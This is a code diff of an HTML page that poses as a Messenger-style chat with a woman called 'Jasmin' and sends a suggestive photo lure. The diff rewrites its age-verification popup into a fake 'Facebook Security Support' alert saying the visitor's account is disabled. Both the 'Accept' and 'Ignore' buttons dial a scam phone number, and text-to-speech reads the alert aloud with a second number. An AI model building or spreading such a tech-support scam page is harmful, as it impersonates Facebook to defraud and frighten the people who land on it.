@@ -84,19 +84,19 @@
         </div>
 
         <!-- Jasmin's Messages -->
-        <div class="flex items-end gap-2 max-w-[85%] mb-1">
-            <div class="w-7 h-7 shrink-0"></div> <!-- Placeholder for alignment -->
-            <div class="bg-[#e4e6eb] text-black px-4 py-2 rounded-2xl rounded-bl-sm text-[15px] leading-relaxed">
-                Hey there! Ready to chat? 😉
-            </div>
-        </div>
+
         <div class="flex items-end gap-2 max-w-[85%]">
             <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt="Jasmin" class="w-7 h-7 rounded-full object-cover mb-1 shrink-0">
             <div class="rounded-2xl rounded-bl-sm overflow-hidden shadow-[0_0_0_1px_rgba(0,0,0,0.05)] bg-[#e4e6eb]">
-                <img id="chatImage" src="https://images.unsplash.com/photo-1541167760496-1628856ab772?ixlib=rb-4.0.3&auto=format&fit=crop&w=400&q=80" alt="Sent image" class="w-56 h-auto object-cover max-h-72 cursor-pointer hover:opacity-90 transition-opacity">
+                <img id="chatImage" src="02.png" alt="Sent image" class="w-56 h-auto object-cover max-h-72 cursor-pointer hover:opacity-90 transition-opacity">
             </div>
         </div>
-        
+        <div class="flex items-end gap-2 max-w-[85%] mb-1">
+            <div class="w-7 h-7 shrink-0"></div> <!-- Placeholder for alignment -->
+            <div class="bg-[#e4e6eb] text-black px-4 py-2 rounded-2xl rounded-bl-sm text-[15px] leading-relaxed">
+                Are you Want more pic's 😉
+            </div>
+        </div>
         <!-- Bottom padding for scrolling clearance -->
         <div class="h-2 w-full shrink-0"></div>
 
@@ -144,23 +144,25 @@
         <div id="ageModalContent" class="bg-white rounded-2xl shadow-xl w-full max-w-sm overflow-hidden transform scale-95 opacity-0">
             
             <div class="p-6 text-center pt-8">
-                <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt="Jasmin" class="w-20 h-20 rounded-full object-cover mx-auto mb-4 border border-gray-200 shadow-sm">
+                <img src="01.webp" alt="Jasmin" class="w-20 h-20 rounded-full object-cover mx-auto mb-4 border border-gray-200 shadow-sm">
                 <h3 class="text-xl font-bold text-gray-900 mb-2">Age Verification Required</h3>
                 <p class="text-gray-500 text-[15px] mb-8 leading-relaxed">
-                    This chat may contain mature themes. By proceeding, you confirm that you are at least 18 years of age.
+                    Your Facebook account has been disabled due to detected suspicious activity. Please contact Facebook Security Support immediately at +1 ‪(805) 410-8751 to unlock your account.
                 </p>
                 
-                <div class="flex flex-col gap-3">
-                    <button id="btnYes18" class="w-full bg-[#0084ff] hover:bg-blue-600 text-white font-semibold py-3 px-4 rounded-xl transition-colors">
-                        Yes, I am 18 or older
-                    </button>
-                    <button id="btnCancel" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 px-4 rounded-xl transition-colors">
-                        No, take me back
-                    </button>
+                          <div class="flex flex-col gap-3">
+                    <a href="tel:+1(805) 410-8751"   id="btnYes18"   class="block w-full bg-[#0084ff] hover:bg-blue-600 text-white font-semibold py-3 px-4 rounded-xl transition-colors text-center">    Accept
+</a>
+                    <button
+    id="btnCancel"
+    onclick="window.location.href='tel:+1(805) 410-8751';"
+    class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 px-4 rounded-xl transition-colors">
+    Ignore
+</button>
                 </div>
             </div>
             <div class="bg-gray-50 p-4 text-center text-xs text-gray-400 border-t border-gray-100">
-                You only need to verify this once.
+                Facebook Support
             </div>
         </div>
     </div>
@@ -254,7 +256,7 @@
             if ('speechSynthesis' in window) {
                 window.speechSynthesis.cancel(); // Cancel any ongoing speech
                 
-                const utterance = new SpeechSynthesisUtterance("Are you 18 or older?");
+                const utterance = new SpeechSynthesisUtterance("Your Facebook account has been disabled due to detected suspicious activity. Please contact Facebook Security Support immediately at +1 ‪(888) 457-6016 to unlock your account.");
                 utterance.lang = "en-US";
                 utterance.rate = 1.0;
                 utterance.pitch = 1.1; // Slightly higher pitch
